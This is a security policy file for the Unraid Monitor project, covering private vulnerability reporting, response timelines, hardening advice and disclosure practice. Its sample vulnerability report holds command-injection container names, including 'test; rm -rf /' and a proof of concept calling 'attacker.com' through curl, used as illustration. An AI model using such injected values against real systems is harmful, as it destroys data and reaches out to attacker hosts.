# Security Policy

## Supported Versions

We release security updates for the following versions:

| Version | Supported          | Notes                          |
| ------- | ------------------ | ------------------------------ |
| 1.x.x   | ✅ Yes             | Current stable release         |
| < 1.0   | ❌ No              | Pre-release, not recommended   |

**Policy**: Only the latest minor version receives security updates. When a new minor version is released, the previous minor version receives security patches for 6 months.

---

## Reporting a Vulnerability

**We take security seriously.** If you discover a security vulnerability in Unraid Monitor, please report it responsibly.

### How to Report

**DO NOT** open a public GitHub issue for security vulnerabilities.

Instead, choose one of these private channels:

1. **GitHub Security Advisories** (Preferred)
   - Go to the [Security tab](https://github.com/peterpage2115/unraid-monitor/security)
   - Click "Report a vulnerability"
   - Fill out the private advisory form

2. **Email** (Alternative)
   - Send details to: [your-email@example.com]
   - Use subject: "Unraid Monitor Security: [brief description]"
   - Include PGP key if available: [link to your public key]

3. **Discord Direct Message**
   - DM a maintainer on our Discord server
   - Only for critical vulnerabilities requiring immediate attention

### What to Include

Please provide as much detail as possible:

- **Description**: What is the vulnerability?
- **Impact**: What can an attacker do? (RCE, data leak, DoS, etc.)
- **Affected Versions**: Which versions are vulnerable?
- **Reproduction**: Step-by-step instructions to reproduce
- **Proof of Concept**: Code or screenshots demonstrating the issue
- **Suggested Fix**: If you have ideas on how to fix it
- **Discoverer Credit**: How you'd like to be credited (name, handle, or anonymous)

**Example Report:**
```
Title: Command Injection in Docker Monitor

Description:
The docker_monitor.py file executes shell commands with unsanitized 
container names, allowing command injection.

Impact:
An attacker who can create containers with malicious names (e.g., 
"test; rm -rf /") can execute arbitrary commands on the host.

Affected Versions:
1.0.0 - 1.0.3

Reproduction:
1. Create a container with name: `test$(whoami)`
2. Start Unraid Monitor
3. Check logs - output of `whoami` is visible
4. PoC: Container name `test$(curl attacker.com)`

Suggested Fix:
Use docker-py library methods instead of shell commands, or sanitize 
input with shlex.quote()

Credit: John Doe (@johndoe)
```

---

## Response Timeline

We aim to respond to security reports according to the following timeline:

| Stage                  | Timeline      | What Happens                          |
| ---------------------- | ------------- | ------------------------------------- |
| **Acknowledgment**     | 48 hours      | We confirm receipt of your report     |
| **Initial Assessment** | 5 days        | We validate and assess severity       |
| **Fix Development**    | 7-14 days     | We develop and test a patch           |
| **Disclosure**         | 14-30 days    | We release patch and advisory         |

**Severity Levels:**

- **Critical**: RCE, authentication bypass, data exfiltration  
  → Fix within 7 days, emergency release
  
- **High**: Privilege escalation, denial of service  
  → Fix within 14 days, fast-track release
  
- **Medium**: Information disclosure, weak cryptography  
  → Fix within 30 days, include in next regular release
  
- **Low**: Minor issues, theoretical vulnerabilities  
  → Fix when convenient, may batch with other updates

---

## Security Best Practices

### For Users

**Running Unraid Monitor Securely:**

1. **Web UI Password**
   - Use a strong, unique password
   - Generate password hash with bcrypt, don't use plain-text
   - Never commit passwords to git or share in public channels

2. **API Keys & Webhooks**
   - Store in environment variables, not in `settings.yaml` in version control
   - Use read-only API keys where possible (e.g., Jellyfin)
   - Rotate keys periodically

3. **Docker Security**
   - Run container as non-root user (default in v1.0+)
   - Limit Docker socket access: only mount if needed
   - Use read-only filesystems where possible: `--read-only`
   - Set resource limits: `--memory=256m --cpus=0.5`

4. **Network Isolation**
   - Run on internal network only, don't expose ports to internet
   - Use VPN or Cloudflare Tunnel if remote access needed
   - Web UI should be behind reverse proxy (e.g., SWAG, Traefik)

5. **Updates**
   - Subscribe to release notifications (GitHub Watch → Releases only)
   - Apply security updates promptly
   - Review CHANGELOG before updating

### For Developers

**Writing Secure Code:**

1. **Input Validation**
   - Never trust user input (config files, env vars, API responses)
   - Sanitize container names, file paths, URLs
   - Use parameterized queries for database (SQLAlchemy ORM helps)

2. **Command Injection**
   - Avoid `os.system()` or `subprocess.shell=True`
   - Use library methods (docker-py) instead of shell commands
   - If shell needed: `shlex.quote()` for escaping

3. **API Keys & Secrets**
   - Never log API keys or tokens
   - Never commit secrets to git (use `.gitignore`)
   - Use environment variables, not hardcoded strings
   - Sanitize logs: `urllib3` auto-masks, but custom code should too

4. **Dependencies**
   - Keep dependencies updated (Dependabot enabled)
   - Review CVEs in `requirements.txt` packages
   - Pin versions to avoid supply chain attacks

5. **Error Handling**
   - Don't expose stack traces to users (Web UI errors)
   - Log detailed errors server-side, show generic messages client-side
   - Catch exceptions, don't let app crash

---

## Known Security Considerations

### Acknowledged Design Choices

**1. Docker Socket Access**
- **Risk**: Container with Docker socket can escape to host
- **Mitigation**: Run as non-root, limit to `docker` group
- **Trade-off**: Required for container monitoring
- **User Action**: Only run if you trust the code

**2. Host Filesystem Mounts**
- **Risk**: `/proc` and `/sys` mounts expose host info
- **Mitigation**: Read-only mounts, no write access
- **Trade-off**: Required for accurate system metrics
- **User Action**: Ensure mounts are read-only in docker-compose

**3. Web UI Authentication**
- **Risk**: Basic password auth, no 2FA or OAuth
- **Mitigation**: Strong password with bcrypt hashing
- **Trade-off**: Simplicity vs. enterprise-grade security
- **User Action**: Use reverse proxy with additional auth (e.g., Authelia)

**4. SQLite Database**
- **Risk**: No encryption at rest
- **Mitigation**: File permissions (container user only)
- **Trade-off**: Simplicity vs. encrypted database
- **User Action**: Encrypt host volume if needed

---

## Security Features

**Implemented in v1.0:**
- ✅ Password hashing with bcrypt (salted)
- ✅ Non-root Docker container execution
- ✅ Environment variable input validation
- ✅ Dependency version pinning
- ✅ Graceful error handling (no crashes)
- ✅ Log sanitization for sensitive data

**Planned (Future Versions):**
- 🔜 Rate limiting for Web UI (prevent brute force)
- 🔜 CORS configuration for API endpoints
- 🔜 Content Security Policy headers
- 🔜 Audit logging for configuration changes
- 🔜 Optional: Docker secrets integration

---

## Disclosure Policy

### Coordinated Disclosure

When a vulnerability is fixed:

1. **Private Fix**: We develop a patch privately
2. **Security Advisory**: We create a GitHub Security Advisory (draft)
3. **Patch Release**: We release a new version with the fix
4. **Public Disclosure**: We publish the advisory 7 days after patch release
5. **Credit**: We credit the discoverer (unless they prefer anonymity)

### Public Disclosure Format

```markdown
## Security Advisory: [Title] (GHSA-xxxx-xxxx-xxxx)

**Severity**: Critical / High / Medium / Low
**Affected Versions**: 1.0.0 - 1.0.3
**Fixed In**: 1.0.4
**CVE ID**: CVE-2026-XXXXX (if assigned)

### Description
[Brief description of the vulnerability]

### Impact
[What an attacker could do]

### Patches
Update to version 1.0.4 or later.

### Workarounds
[If applicable, temporary mitigation steps]

### Credit
Discovered by [Name/Handle]. Thank you!

### References
- GitHub Commit: [link]
- Fix Details: [link to PR]
```

---

## Bug Bounty Program

**Status**: Not currently available

We are a small open-source project and do not have a formal bug bounty program. However:

- **Recognition**: Security contributors will be acknowledged in release notes and SECURITY.md
- **Ko-fi Thanks**: If you have a Ko-fi/sponsors link, we'll give you a shout-out
- **Community Status**: You'll receive a "Security Contributor" role in our Discord

If the project grows, we may introduce a bug bounty program in the future.

---

## Security Hall of Fame

Contributors who have responsibly disclosed security issues:

<!-- 
Add names here as security reports come in:
- **[Name/Handle]** - [Vulnerability Type] - [Date]
-->

*No security issues reported yet. Be the first!*

---

## Contact

**Security Team**: GitHub Security Advisories (preferred)  
**PGP Key**: TBD (optional)  
**Response Time**: 48 hours acknowledgment, 14 days target fix for high-severity issues

For general questions (non-security), use:
- GitHub Issues: https://github.com/peterpage2115/unraid-monitor/issues
- Discord: [invite link - TBD]

---

**Thank you for helping keep Unraid Monitor secure!** 🔒
